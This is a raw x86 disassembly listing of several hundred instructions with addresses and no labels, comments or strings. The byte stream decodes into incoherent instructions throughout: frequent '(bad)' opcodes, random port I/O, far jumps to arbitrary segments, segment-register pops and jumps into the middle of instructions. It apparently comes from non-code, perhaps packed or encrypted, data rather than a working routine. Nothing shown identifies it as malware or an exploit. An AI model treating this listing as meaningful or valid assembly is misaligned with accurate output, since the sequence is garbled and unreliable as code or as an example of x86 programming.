  42f52a:	mov    DWORD PTR [edi+ebx*2-0x4a7cf7cc],edx
  42f531:	rol    BYTE PTR [ecx+esi*4+0x76],1
  42f535:	jp     0x42f59c
  42f537:	pop    ebx
  42f538:	mov    ?,WORD PTR ds:0xb0b6ebf6
  42f53e:	lods   al,BYTE PTR ds:[esi]
  42f53f:	les    eax,FWORD PTR [ecx]
  42f541:	add    al,BYTE PTR [edi-0x20]
  42f544:	ret    0xac1c
  42f547:	mov    al,0xe6
  42f549:	pop    ebx
  42f54a:	fist   DWORD PTR [ecx]
  42f54c:	vpmuludq ymm5,ymm5,YMMWORD PTR [esi-0x7be04c3]
  42f554:	sbb    eax,0xd6152c10
  42f559:	out    dx,al
  42f55a:	call   0xe9acec
  42f55f:	outs   dx,BYTE PTR ds:[esi]
  42f560:	pop    ss
  42f561:	and    eax,0x9b8edb82
  42f566:	outs   dx,DWORD PTR ds:[esi]
  42f567:	addr16 mov ds:0x5d8a,eax
  42f56b:	adc    al,0x97
  42f56d:	dec    ebp
  42f56e:	loopne 0x42f523
  42f570:	push   0xbb11d05
  42f575:	and    ch,bh
  42f577:	aaa    
  42f578:	outs   dx,BYTE PTR ds:[esi]
  42f579:	xchg   BYTE PTR [eax+0x21],ah
  42f57c:	pop    eax
  42f57d:	dec    ecx
  42f57e:	shl    BYTE PTR [ebp+ebx*1-0x20],1
  42f582:	add    eax,0xaf5d82ec
  42f587:	test   DWORD PTR [edx-0x246b2b5a],ecx
  42f58d:	sbb    ebp,DWORD PTR [eax-0x4c43d6e3]
  42f593:	push   ecx
  42f594:	inc    ebx
  42f595:	add    BYTE PTR [eax],0xc2
  42f598:	adc    al,0x11
  42f59a:	pop    esp
  42f59b:	push   0x4b
  42f59d:	inc    eax
  42f59e:	and    al,0x4c
  42f5a0:	xlat   BYTE PTR ds:[ebx]
  42f5a1:	mov    WORD PTR [edx-0x70],cs
  42f5a4:	cs ins BYTE PTR es:[edi],dx
  42f5a6:	or     eax,0x44d61311
  42f5ab:	push   0x9ab2873
  42f5b0:	call   0xe7a0fe9f
  42f5b5:	adc    bh,dh
  42f5b7:	inc    eax
  42f5b8:	inc    ecx
  42f5b9:	mov    ebx,0x3fe6a215
  42f5be:	or     ecx,ebx
  42f5c0:	mov    edx,edi
  42f5c2:	add    ebx,edx
  42f5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5c5:	(bad)  
  42f5c6:	ror    DWORD PTR [esi-0x50],1
  42f5c9:	push   0x4853b5aa
  42f5ce:	sbb    ebx,DWORD PTR [ebx]
  42f5d0:	sbb    ebx,DWORD PTR [ebx-0x1a]
  42f5d3:	inc    DWORD PTR [edi+0x42ca33f9]
  42f5d9:	mov    ah,0x34
  42f5db:	push   esp
  42f5dc:	cmp    ebp,DWORD PTR [eax+0x1706a715]
  42f5e2:	or     bl,dh
  42f5e4:	ins    DWORD PTR es:[edi],dx
  42f5e5:	mov    ds:0x5de40b15,eax
  42f5ea:	push   es
  42f5eb:	sbb    edx,ebx
  42f5ed:	(bad)  
  42f5ee:	cmp    cl,BYTE PTR [edx+0x291c8258]
  42f5f4:	xchg   ebx,eax
  42f5f5:	or     al,0x85
  42f5f7:	fild   DWORD PTR [ebp+0x13c5ddb6]
  42f5fd:	dec    ebp
  42f5fe:	inc    esp
  42f5ff:	mov    bh,0x77
  42f601:	out    dx,al
  42f602:	mov    edx,0x4442082d
  42f607:	xchg   edi,eax
  42f608:	mov    dh,0xa
  42f60a:	test   eax,0x5611d2dc
  42f60f:	add    al,0x9
  42f611:	mov    edx,0xcad54340
  42f616:	mov    edx,0xe87e6c8f
  42f61b:	(bad)  
  42f61c:	add    eax,0xca42a8b0
  42f621:	adc    BYTE PTR [esi+0x2c],ch
  42f624:	cld    
  42f625:	adc    al,0x1d
  42f627:	push   ebp
  42f628:	cmp    ecx,DWORD PTR [ebx+0x1f785519]
  42f62e:	ins    DWORD PTR es:[edi],dx
  42f62f:	pop    ss
  42f630:	inc    ecx
  42f631:	or     esp,DWORD PTR ds:0xbf839c3b
  42f637:	xchg   edx,eax
  42f638:	jne    0x42f665
  42f63a:	push   esp
  42f63b:	sbb    eax,DWORD PTR [ecx-0x3b25880]
  42f641:	fstp   QWORD PTR [ebx+0x63]
  42f644:	fist   DWORD PTR [esp+ebx*8]
  42f647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f649:	xor    dh,BYTE PTR [ecx]
  42f64b:	cdq    
  42f64c:	lods   eax,DWORD PTR ds:[esi]
  42f64d:	lock mov al,0x10
  42f650:	mov    cl,0x6d
  42f652:	jmp    0xf3acb02
  42f657:	or     eax,0xd14b40
  42f65c:	shl    BYTE PTR [ecx-0x69],1
  42f65f:	int3   
  42f660:	mov    al,0x8b
  42f662:	push   0xcfcc757
  42f667:	lahf   
  42f668:	dec    eax
  42f669:	sbb    al,0x80
  42f66b:	outs   dx,BYTE PTR ds:[esi]
  42f66c:	xor    al,0x0
  42f66e:	push   edi
  42f66f:	cmp    ebp,DWORD PTR [edi-0x45]
  42f672:	punpckhdq mm6,QWORD PTR [edi+0x4b159a36]
  42f679:	stos   DWORD PTR es:[edi],eax
  42f67a:	xchg   edx,eax
  42f67b:	inc    ebx
  42f67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f67d:	out    0x89,al
  42f67f:	sub    eax,0x8bdd0434
  42f684:	xlat   BYTE PTR ds:[ebx]
  42f685:	xchg   ebx,eax
  42f686:	pop    eax
  42f687:	(bad)  
  42f688:	pop    ebx
  42f689:	aaa    
  42f68a:	push   eax
  42f68b:	pop    ebp
  42f68c:	fidivr WORD PTR [eax-0x609743fe]
  42f692:	mov    eax,ds:0x90d46c00
  42f697:	sbb    ecx,DWORD PTR [eax-0x42afcad2]
  42f69d:	cwde   
  42f69e:	xor    eax,0xbc55db1
  42f6a3:	push   ebp
  42f6a4:	mov    ah,0x75
  42f6a6:	adc    eax,0x18fbba8d
  42f6ab:	add    eax,esp
  42f6ad:	lods   eax,DWORD PTR ds:[esi]
  42f6ae:	lods   eax,DWORD PTR ds:[esi]
  42f6af:	je     0x42f63a
  42f6b1:	rcl    DWORD PTR [esi],0x3c
  42f6b4:	jecxz  0x42f697
  42f6b6:	sub    dl,ah
  42f6b8:	push   esi
  42f6b9:	popa   
  42f6ba:	adc    al,cl
  42f6bc:	in     eax,0xdc
  42f6be:	call   0xae15bd59
  42f6c3:	in     eax,dx
  42f6c4:	int3   
  42f6c5:	mov    cl,0x13
  42f6c7:	fcmovb st,st(2)
  42f6c9:	mov    dh,0x2f
  42f6cb:	push   cs
  42f6cc:	mov    ebx,0x6c545d6f
  42f6d1:	fisttp DWORD PTR [ecx]
  42f6d3:	outs   dx,BYTE PTR ds:[esi]
  42f6d4:	jae    0x42f68f
  42f6d6:	fsub   st,st(2)
  42f6d8:	out    0x4d,al
  42f6da:	shr    BYTE PTR [esi],1
  42f6dc:	test   al,0xb2
  42f6de:	loop   0x42f6a2
  42f6e0:	clc    
  42f6e1:	jmp    0x6eb4:0x12b744a9
  42f6e8:	mov    eax,ds:0x884c4186
  42f6ed:	lods   eax,DWORD PTR ds:[esi]
  42f6ee:	mov    eax,ds:0xa5c8476a
  42f6f3:	gs fs dec ecx
  42f6f6:	inc    BYTE PTR [ebp+0x1b]
  42f6f9:	push   esp
  42f6fa:	stc    
  42f6fb:	out    0xaa,eax
  42f6fd:	add    BYTE PTR [eax],cl
  42f6ff:	rcr    DWORD PTR [esi+0x6d1b80f6],1
  42f705:	inc    ebx
  42f706:	aaa    
  42f707:	(bad)  
  42f708:	dec    eax
  42f709:	stos   BYTE PTR es:[edi],al
  42f70a:	sub    bl,bl
  42f70c:	out    dx,al
  42f70d:	jo     0x42f772
  42f70f:	mov    ds:0x3ae57306,eax
  42f714:	mov    edi,0x69c3dc9f
  42f719:	pop    ebx
  42f71a:	mov    eax,0x9ad910f0
  42f71f:	repnz adc bh,al
  42f722:	xor    eax,0x76cb9817
  42f727:	inc    esp
  42f728:	cmc    
  42f729:	arpl   sp,dx
  42f72b:	in     al,0x86
  42f72d:	fstp   TBYTE PTR [esi+eiz*4]
  42f730:	cdq    
  42f731:	fild   DWORD PTR [esi-0x7f]
  42f734:	sub    ebx,DWORD PTR [eax]
  42f736:	fisttp DWORD PTR [esi+0x2f]
  42f739:	adc    al,0x4
  42f73b:	fcomp  QWORD PTR [ebx+ecx*1]
  42f73e:	(bad)  
  42f740:	sets   BYTE PTR [eax+0x154ad8d7]
  42f747:	pop    ebp
  42f748:	mov    ds:0x2c0b4cec,eax
  42f74d:	mov    dh,0x5b
  42f74f:	and    ebx,DWORD PTR [edx+0x19]
  42f752:	dec    eax
  42f753:	pop    ebp
  42f754:	shl    DWORD PTR [esi],1
  42f756:	push   ebx
  42f757:	(bad)  
  42f758:	fadd   DWORD PTR [ebp-0x1fd7d652]
  42f75e:	and    BYTE PTR [eax],0xa3
  42f761:	dec    ecx
  42f762:	push   0xfa2ba37
  42f767:	xor    ecx,eax
  42f769:	push   ds
  42f76a:	jb     0x42f7be
  42f76c:	mov    bl,0x8e
  42f76e:	mov    ch,BYTE PTR [esi]
  42f770:	cmp    BYTE PTR [ebx],cl
  42f772:	or     eax,0x6d2dfe64
  42f777:	aaa    
  42f778:	mov    dh,0xda
  42f77a:	add    al,0x83
  42f77c:	es jns 0x42f71e
  42f77f:	mov    ds:0x3d1da902,al
  42f784:	or     eax,DWORD PTR [esi]
  42f786:	mov    dh,0xad
  42f788:	bound  ebp,QWORD PTR [edx+0x4e930e2d]
  42f78e:	xor    al,0x13
  42f790:	or     DWORD PTR [eax-0x2d9fe44b],edi
  42f796:	xor    ch,dh
  42f798:	push   esi
  42f799:	mov    ds:0xa5829171,al
  42f79e:	test   al,0xb6
  42f7a0:	mov    al,ds:0x4ac1a187
  42f7a5:	sub    al,0x34
  42f7a7:	sub    BYTE PTR [esi],0xb9
  42f7aa:	adc    eax,0xdbd8ee07
  42f7af:	lods   eax,DWORD PTR ds:[esi]
  42f7b0:	inc    esp
  42f7b1:	sub    eax,0xf80d0f55
  42f7b6:	lods   al,BYTE PTR ds:[esi]
  42f7b7:	les    esp,FWORD PTR [edx+0x6f]
  42f7ba:	outs   dx,BYTE PTR ds:[esi]
  42f7bb:	dec    ebp
  42f7bc:	inc    eax
  42f7bd:	sbb    eax,esi
  42f7bf:	pop    edx
  42f7c0:	arpl   WORD PTR [esi+0xe295c65],bx
  42f7c6:	and    ch,BYTE PTR [esi]
  42f7c8:	xor    al,0xc3
  42f7ca:	cli    
  42f7cb:	adc    ah,bh
  42f7cd:	ins    DWORD PTR es:[edi],dx
  42f7ce:	push   0xee8db694
  42f7d3:	sbb    BYTE PTR [edi],ah
  42f7d5:	gs out 0xb3,al
  42f7d8:	push   ss
  42f7d9:	jmp    0xf4ef:0x7056e828
  42f7e0:	bound  esi,QWORD PTR [ebx+0x41]
  42f7e3:	(bad)  
  42f7e4:	push   eax
  42f7e5:	mov    cl,0x5d
  42f7e7:	ds inc esi
  42f7e9:	in     eax,0xaa
  42f7eb:	and    al,0x69
  42f7ed:	rcr    BYTE PTR [edx],0x5d
  42f7f0:	call   0xc9fbe097
  42f7f5:	and    cl,0xeb
  42f7f8:	mov    dl,BYTE PTR [ebx+eax*2+0x4aadcb05]
  42f7ff:	add    eax,0xc2fc5468
  42f804:	ficomp DWORD PTR [edx]
  42f806:	mov    ch,BYTE PTR [ebp+0x69]
  42f809:	shl    DWORD PTR [ecx+ecx*4-0x7f],cl
  42f80d:	cmp    eax,0x71151044
  42f812:	pop    ebx
  42f813:	pop    eax
  42f814:	push   cs
  42f815:	and    ecx,DWORD PTR [edx]
  42f817:	int3   
  42f818:	cmp    BYTE PTR [edx-0x6f],cl
  42f81b:	fdivr  DWORD PTR [eax-0x6de8c92f]
  42f821:	jge    0x42f7a6
  42f823:	sar    BYTE PTR [edx+0x34],0xc9
  42f827:	jg     0x42f840
  42f829:	fisubr DWORD PTR [ebp+0x1d807801]
  42f82f:	sub    BYTE PTR [ecx+ebp*1-0x1c7307ab],al
  42f836:	inc    esi
  42f837:	pop    es
  42f838:	push   ecx
  42f839:	(bad)  
  42f83a:	pushf  
  42f83b:	adc    eax,0xc1f0dcba
  42f840:	lods   eax,DWORD PTR ds:[esi]
  42f841:	ins    DWORD PTR es:[edi],dx
  42f842:	inc    ebp
  42f843:	push   DWORD PTR [ecx+ecx*4-0x49709bce]
  42f84a:	call   0xbea9:0xecf11da8
  42f851:	sub    al,0xd0
  42f853:	xor    al,0xcb
  42f855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f857:	ss inc ebp
  42f859:	sub    ebx,esi
  42f85b:	mov    ch,0x2
  42f85d:	xlat   BYTE PTR ds:[ebx]
  42f85e:	and    BYTE PTR [eax-0x26],ch
  42f861:	ins    DWORD PTR es:[edi],dx
  42f862:	mov    eax,ds:0xd745dd6d
  42f867:	int    0xc
  42f869:	into   
  42f86a:	mov    eax,0x42e820a2
  42f86f:	or     eax,ebx
  42f871:	je     0x42f8e3
  42f873:	push   ebp
  42f874:	xor    al,0x4d
  42f876:	je     0x42f81b
  42f878:	fnsave [esi+0x3e2a3206]
  42f87e:	xchg   esi,eax
  42f87f:	push   ebx
  42f880:	out    dx,eax
  42f881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f882:	cmc    
  42f883:	iret   
  42f884:	push   ecx
  42f885:	mov    ch,0xaa
  42f887:	ins    DWORD PTR es:[edi],dx
  42f888:	ss mov dh,0x35
  42f88b:	loopne 0x42f8bd
  42f88d:	adc    eax,0xbe956c6d
  42f892:	cmp    al,0x75
  42f894:	mov    ah,0xb4
  42f896:	pop    ebp
  42f897:	jo     0x42f81a
  42f899:	mov    ch,0xcc
  42f89b:	cmp    ecx,ebx
  42f89d:	and    DWORD PTR [ebp+ebx*2-0x24],edi
  42f8a1:	sbb    al,BYTE PTR [eax]
  42f8a3:	cs inc esi
  42f8a5:	popa   
  42f8a6:	test   eax,0xef14156d
  42f8ab:	xchg   esp,eax
  42f8ac:	cs ins BYTE PTR es:[edi],dx
  42f8ae:	or     eax,0x14ce4415
  42f8b3:	mov    eax,ds:0x5d5c51af
  42f8b8:	push   ebp
  42f8b9:	fcomp  QWORD PTR [esi-0x34ff595]
  42f8bf:	adc    DWORD PTR [edi+0x56],0x1b6ed6d1
  42f8c6:	xchg   esi,eax
  42f8c7:	lock mov dh,0xb8
  42f8ca:	nop
  42f8cb:	into   
  42f8cc:	ja     0x42f856
  42f8ce:	mov    esi,eax
  42f8d0:	push   cs
  42f8d1:	mov    edx,0x5b90e98b
  42f8d6:	hlt    
  42f8d7:	js     0x42f903
  42f8d9:	xor    DWORD PTR [ecx+0x1d],edx
  42f8dc:	lds    ebp,FWORD PTR [ebp+0x7b]
  42f8df:	or     ah,bh
  42f8e1:	out    0x17,eax
  42f8e3:	in     al,0x81
  42f8e5:	mov    al,ds:0xe8edb689
  42f8ea:	sub    ebp,edi
  42f8ec:	cs ret 0x16da
  42f8f0:	test   al,0xb6
  42f8f2:	push   esp
  42f8f3:	xlat   BYTE PTR ds:[ebx]
  42f8f4:	mov    edi,0xed320f2a
  42f8f9:	pop    ebx
  42f8fa:	mov    eax,ds:0x68768688
  42f8ff:	mov    dl,0x59
  42f901:	inc    sp
  42f903:	ins    BYTE PTR es:[edi],dx
  42f904:	or     edx,DWORD PTR [ebp-0x39]
  42f907:	dec    eax
  42f908:	shl    DWORD PTR [ebp+0x5d881a16],1
  42f90e:	pop    edi
  42f90f:	call   0x94f1:0x8fa3
  42f915:	mov    ebx,0x65d82a55
  42f91a:	and    al,0xdd
  42f91c:	and    eax,0xd014c43d
  42f921:	(bad)  
  42f922:	outs   dx,BYTE PTR ds:[esi]
  42f923:	ins    DWORD PTR es:[edi],dx
  42f924:	and    ebx,DWORD PTR [ecx-0x17]
  42f927:	ds dec esp
  42f929:	stos   BYTE PTR es:[edi],al
  42f92a:	push   cs
  42f92b:	xor    BYTE PTR [ebp+0x2b],ch
  42f92e:	pop    esi
  42f92f:	ins    BYTE PTR es:[edi],dx
  42f930:	fld    DWORD PTR [esi+ebx*8]
  42f933:	inc    ebp
  42f934:	dec    ebx
  42f935:	pop    ecx
  42f936:	and    ch,BYTE PTR [eax+0x7]
  42f939:	shl    dl,0xb8
  42f93c:	mov    ebp,0x5d16dc98
  42f941:	add    BYTE PTR [ebp+0x73],ch
  42f944:	dec    BYTE PTR [edi+ebx*2-0x39398180]
  42f94b:	inc    ebx
  42f94c:	shl    BYTE PTR [ecx],0xf
  42f94f:	dec    eax
  42f950:	stos   DWORD PTR es:[edi],eax
  42f951:	dec    edx
  42f952:	js     0x42f981
  42f954:	ins    DWORD PTR es:[edi],dx
  42f955:	or     ebx,ebx
  42f957:	imul   esi,DWORD PTR [esi+0x44051f40],0xb62862c0
  42f961:	mov    fs,eax
  42f963:	mov    dh,0x23
  42f965:	popf   
  42f966:	pop    ss
  42f967:	add    al,0x65
  42f969:	adc    BYTE PTR [ebx+0x5034231a],al
  42f96f:	fstp   st(2)
  42f971:	push   ebx
  42f972:	add    esi,DWORD PTR [edx+0x123be4de]
  42f978:	mov    ds:0xdb6db6e2,al
  42f97d:	outs   dx,DWORD PTR ds:[esi]
  42f97e:	mov    esp,?
  42f980:	ret    0x604c
  42f983:	mov    edx,0x47680ad0
  42f988:	stos   BYTE PTR es:[edi],al
  42f989:	cmovbe edx,eax
  42f98c:	in     al,0xa8
  42f98e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f98f:	test   al,0x29
  42f991:	out    0xb8,al
  42f993:	sbb    ch,bh
  42f995:	sbb    eax,0x700a6c41
  42f99a:	push   edi
  42f99b:	shl    dl,cl
  42f99d:	add    esi,DWORD PTR fs:[edi+0x5ff9aa2e]
  42f9a4:	cwde   
  42f9a5:	sti    
  42f9a6:	test   BYTE PTR [edx+eiz*4-0x7fa5a25d],al
  42f9ad:	int    0x4d
  42f9af:	and    bh,dl
  42f9b1:	pop    es
  42f9b2:	jno    0x42fa29
  42f9b4:	ss push 0xf01d6a5b
  42f9ba:	leave  
  42f9bb:	xor    dh,BYTE PTR [edi]
  42f9bd:	xor    esp,ecx
  42f9bf:	mov    al,ds:0x1dd0b96d
  42f9c4:	test   eax,0xd4059e48
  42f9c9:	leave  
  42f9ca:	sar    DWORD PTR [esi],1
  42f9cc:	mov    ch,0x1
  42f9ce:	mov    dh,0x92
  42f9d0:	sbb    ebp,ebp
  42f9d2:	je     0x42fa3b
  42f9d4:	or     edx,DWORD PTR [eax]
  42f9d6:	ins    DWORD PTR es:[edi],dx
  42f9d7:	lahf   
  42f9d8:	mov    eax,0xb51ae836
  42f9dd:	jb     0x42f99e
  42f9df:	sahf   
  42f9e0:	cwde   
  42f9e1:	fnstsw WORD PTR [edx-0x5dda2916]
  42f9e7:	push   ebx
  42f9e8:	inc    ecx
  42f9e9:	daa    
  42f9ea:	jg     0x42f975
  42f9ec:	cmp    BYTE PTR [ebx-0xe],bh
  42f9ef:	call   0xac62:0x53a0a962
  42f9f6:	mov    eax,0x6da21aa3
  42f9fb:	add    edi,ecx
  42f9fd:	push   ebp
  42f9fe:	jp     0x42fa44
  42fa00:	popf   
  42fa01:	xor    DWORD PTR [esi-0x73271a50],0x5bb23c55
  42fa0b:	mov    dl,0x44
  42fa0d:	outs   dx,BYTE PTR ds:[esi]
  42fa0e:	adc    ebp,DWORD PTR [edx+ecx*1-0x1e]
  42fa12:	test   al,0x2f
  42fa14:	aaa    
  42fa15:	xor    BYTE PTR [edi+0x71],dh
  42fa18:	fcomp  st(2)
  42fa1a:	scas   al,BYTE PTR es:[edi]
  42fa1b:	pusha  
  42fa1c:	pop    esp
  42fa1d:	mov    cl,0xfb
  42fa1f:	sbb    eax,0x72f598b3
  42fa24:	mov    ah,0x8d
  42fa26:	bound  ebx,QWORD PTR [ebx-0x7b]
  42fa29:	mov    edx,0xb44a2e3b
  42fa2e:	sub    al,0xdb
  42fa30:	mov    dh,0xad
  42fa32:	adc    eax,0xf5d01a02
  42fa37:	loopne 0x42f9f8
  42fa39:	sbb    BYTE PTR [ebp+0x53],ah
  42fa3c:	adc    eax,0x3a7a76b7
  42fa41:	mov    dh,0x1d
  42fa43:	in     eax,0xac
  42fa45:	call   0x256c:0x61510b14
  42fa4c:	mov    esi,0x6daa2819
  42fa51:	push   eax
  42fa52:	inc    ebx
  42fa53:	mov    DWORD PTR [esi+0x7],ecx
  42fa56:	xchg   ebx,eax
  42fa57:	mov    esp,0xdadd511d
  42fa5c:	into   
  42fa5d:	icebp  
  42fa5e:	retf   0x832
  42fa61:	cld    
  42fa62:	xlat   BYTE PTR ds:[ebx]
  42fa63:	(bad)  
  42fa64:	mov    BYTE PTR [edx+0x44],cl
  42fa67:	jmp    0x42faa5
  42fa69:	mov    bl,0x16
  42fa6b:	sbb    al,0x9b
  42fa6d:	jmp    0xec87:0x8b807653
  42fa74:	and    eax,0xada58a9
  42fa79:	aam    0x17
  42fa7b:	ds dec ebp
  42fa7d:	stos   DWORD PTR es:[edi],eax
  42fa7e:	clc    
  42fa7f:	push   cs
  42fa80:	ins    DWORD PTR es:[edi],dx
  42fa81:	pop    ebp
  42fa82:	push   esp
  42fa83:	pop    esp
  42fa84:	and    al,BYTE PTR [ecx]
  42fa86:	loopne 0x42fa6a
  42fa88:	fadd   DWORD PTR [ebx-0x292f9298]
  42fa8e:	mov    eax,0x99af3062
  42fa93:	and    edx,DWORD PTR [eax+0xa]
  42fa96:	in     al,dx
  42fa97:	ins    DWORD PTR es:[edi],dx
  42fa98:	retf   0xb415
  42fa9b:	outs   dx,BYTE PTR ds:[esi]
  42fa9c:	or     ah,BYTE PTR [edx]
  42fa9e:	inc    edx
  42fa9f:	and    eax,0xb685b740
  42faa4:	mov    cl,0x77
  42faa6:	add    DWORD PTR [ebx+0x3d],edi
  42faa9:	loopne 0x42fa57
  42faab:	jecxz  0x42fa66
  42faad:	int3   
  42faae:	in     al,0x68
  42fab0:	fcmovnu st,st(2)
  42fab2:	push   0x2ecd489e
  42fab7:	push   esp
  42fab8:	or     BYTE PTR [esi+0x258229a8],dh
  42fabe:	push   es
  42fabf:	ins    BYTE PTR es:[edi],dx
  42fac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fac1:	pop    esi
  42fac2:	mov    dh,0x11
  42fac4:	aam    0x96
  42fac6:	mov    edx,0x5460b338
  42facb:	adc    al,0x36
  42facd:	sbb    bl,bl
  42facf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fad0:	loopne 0x42fb46
  42fad2:	sbb    BYTE PTR [esi+0x62a29c63],0x4d
  42fad9:	adc    BYTE PTR [edi+edx*1+0x28],ch
  42fadd:	sbb    al,0xd8
  42fadf:	pop    edi
  42fae0:	xchg   ecx,eax
  42fae1:	iret   
  42fae2:	test   eax,0xa51ba81b
  42fae7:	adc    ch,BYTE PTR [esi+0x72]
  42faea:	ss xchg ebx,eax
  42faec:	or     al,0x2e
  42faee:	nop
  42faef:	push   0xb06b7503
  42faf4:	mov    dh,0xed
  42faf6:	sbb    DWORD PTR [edi],ecx
  42faf8:	mov    al,ds:0x50db631
  42fafd:	jl     0x42fa97
  42faff:	adc    al,0x1b
  42fb01:	pushf  
  42fb02:	jge    0x42fadb
  42fb04:	push   eax
  42fb05:	xor    eax,0xda203b43
  42fb0a:	shr    DWORD PTR [ecx-0x7c],1
  42fb0d:	dec    esp
  42fb0e:	fist   WORD PTR [edi]
  42fb10:	cs aam 0x6e
  42fb13:	(bad)  [ecx+0xb]
  42fb16:	popf   
  42fb17:	push   ebx
  42fb18:	inc    ebx
  42fb19:	push   eax
  42fb1a:	xchg   dh,ah
  42fb1c:	mov    ebx,0x1a8850c9
  42fb21:	or     ch,bl
  42fb23:	ja     0x42fb10
  42fb25:	inc    edi
  42fb26:	adc    eax,0x2c0952b7
  42fb2b:	sbb    eax,0x46c62369
  42fb30:	popa   
  42fb31:	arpl   WORD PTR ds:0xd361549b,ax
  42fb37:	test   BYTE PTR [ecx+eiz*8],cl
  42fb3a:	jno    0x42fba7
  42fb3c:	mov    ds:0x8df724e8,al
  42fb41:	sti    
  42fb42:	push   0x655bdc6f
  42fb47:	fild   DWORD PTR [ecx+0x0]
  42fb4a:	cmp    eax,0xa01f5fb9
  42fb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb50:	retf   
  42fb51:	or     ebx,DWORD PTR [ebp+0x6c]
  42fb54:	fcmovb st,st(5)
  42fb56:	dec    DWORD PTR [edi-0x3c]
  42fb59:	icebp  
  42fb5a:	add    ch,dl
  42fb5c:	mov    edi,0xa0a3b550
  42fb61:	mov    edx,0xb56e5325
  42fb66:	ins    DWORD PTR es:[edi],dx
  42fb67:	test   al,0xd8
  42fb69:	jo     0x42fb47
  42fb6b:	stc    
  42fb6c:	inc    edx
  42fb6d:	inc    esi
  42fb6e:	(bad)  
  42fb6f:	pop    ecx
  42fb70:	inc    ebx
  42fb71:	lods   eax,DWORD PTR ds:[esi]
  42fb72:	mov    ds:0x8d297eda,eax
  42fb77:	inc    edx
  42fb78:	inc    ecx
  42fb79:	pushf  
  42fb7a:	hlt    
  42fb7b:	cmc    
  42fb7c:	fwait
  42fb7d:	sbb    dl,0x4
  42fb80:	aam    0x69
  42fb82:	shl    bh,cl
  42fb84:	inc    ebp
  42fb85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb86:	mov    dl,0xc1
  42fb88:	ins    DWORD PTR es:[edi],dx
  42fb89:	imul   ebp,ebx,0xffffff9e
  42fb8c:	sbb    cl,BYTE PTR [ebp+0x3e]
  42fb8f:	and    eax,0x60b5fcf
  42fb94:	pop    ss
  42fb95:	mov    dh,0x85
  42fb97:	pop    esi
  42fb98:	lods   al,BYTE PTR ds:[esi]
  42fb99:	mov    al,0xdd
  42fb9b:	adc    BYTE PTR [esi+0x2a376b3d],dl
  42fba1:	fmul   st(2),st
  42fba3:	mov    DWORD PTR [ebx+ecx*4-0x4e],ebx
  42fba7:	jmp    0x42fbd1
  42fba9:	cmp    DWORD PTR [eax-0x3e],esp
  42fbac:	inc    edx
  42fbad:	pop    ss
  42fbae:	inc    esp
  42fbaf:	mov    esp,0x6c37546d
  42fbb5:	mov    al,ds:0xbc3adbb6
  42fbba:	aad    0x9f
  42fbbc:	das    
  42fbbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbbe:	xor    BYTE PTR [ebp-0x71],dh
  42fbc1:	mov    ds:0x53141d6e,eax
  42fbc6:	push   ebp
  42fbc7:	push   esi
  42fbc8:	jns    0x42fb6e
  42fbca:	test   al,0x15
  42fbcc:	mov    ds:0x4b80a05d,al
  42fbd1:	cmp    BYTE PTR [ecx-0x779303aa],ah
  42fbd7:	call   0xd9445b8e
  42fbdc:	add    eax,0xbb77ce2d
  42fbe1:	ins    DWORD PTR es:[edi],dx
  42fbe2:	or     eax,0x3ee40c14
  42fbe7:	mov    ah,0x9e
  42fbe9:	sbb    DWORD PTR [ebx],edx
  42fbeb:	jge    0x42fba1
  42fbed:	add    DWORD PTR [eax+0xc7e8f5b],esp
  42fbf3:	dec    edx
  42fbf4:	jno    0x42fb8c
  42fbf6:	mov    al,0x2b
  42fbf8:	ss push ecx
  42fbfa:	aas    
  42fbfb:	adc    eax,0xc32d9668
  42fc00:	in     eax,dx
  42fc01:	or     ecx,DWORD PTR [edx+0x27dd79ad]
  42fc07:	imul   edx,DWORD PTR [ebp+0x32],0xd1175b6d
  42fc0e:	dec    ebp
  42fc0f:	mov    DWORD PTR [ecx],esp
  42fc11:	mov    al,0x4a
  42fc13:	mov    ah,0x2
  42fc15:	cmc    
  42fc16:	push   ecx
  42fc17:	shl    DWORD PTR [ebp+0x67e90142],1
  42fc1d:	(bad)  
  42fc1f:	rol    dl,cl
  42fc21:	(bad)  
  42fc22:	add    ebp,DWORD PTR [edi]
  42fc24:	push   esi
  42fc25:	sub    ecx,DWORD PTR [ebx+0x77ca805c]
  42fc2b:	or     al,0x44
  42fc2d:	mov    ah,0x2b
  42fc2f:	stos   BYTE PTR es:[edi],al
  42fc30:	out    dx,eax
  42fc31:	mov    esi,0xe55703c3
  42fc36:	fbstp  TBYTE PTR [esi]
  42fc38:	adc    eax,0xa7a4f4e4
  42fc3d:	add    BYTE PTR [esi],cl
  42fc3f:	cmp    DWORD PTR [eax],eax
  42fc41:	fistp  QWORD PTR [esi+edi*1]
  42fc44:	or     dl,bl
  42fc46:	inc    ebp
  42fc47:	inc    ebp
  42fc48:	xchg   edi,eax
  42fc49:	jae    0x42fc0c
  42fc4b:	mov    esi,0xed40ed8b
  42fc50:	cdq    
  42fc51:	repz into 
  42fc53:	adc    eax,0x7718d811
  42fc58:	test   eax,0x621360dd
  42fc5d:	jl     0x42fc9d
  42fc5f:	xor    eax,0x5f1eaa8f
  42fc64:	rcl    BYTE PTR [ecx+0x2c],1
  42fc67:	(bad)  
  42fc68:	test   ah,0xef
  42fc6b:	jecxz  0x42fcd8
  42fc6d:	mov    ebx,0xa9b8d0b5
  42fc72:	mov    ds:0x26f7d8a3,eax
  42fc77:	popf   
  42fc78:	(bad)  
  42fc79:	loopne 0x42fce0
  42fc7b:	adc    al,0x1b
  42fc7d:	fild   DWORD PTR [esi-0x1]
  42fc80:	ins    DWORD PTR es:[edi],dx
  42fc81:	add    eax,0xbb9b4c5
  42fc86:	mov    bh,0x4a
  42fc88:	pop    ebx
  42fc89:	popa   
  42fc8a:	(bad)  
  42fc8b:	mov    al,0x1c
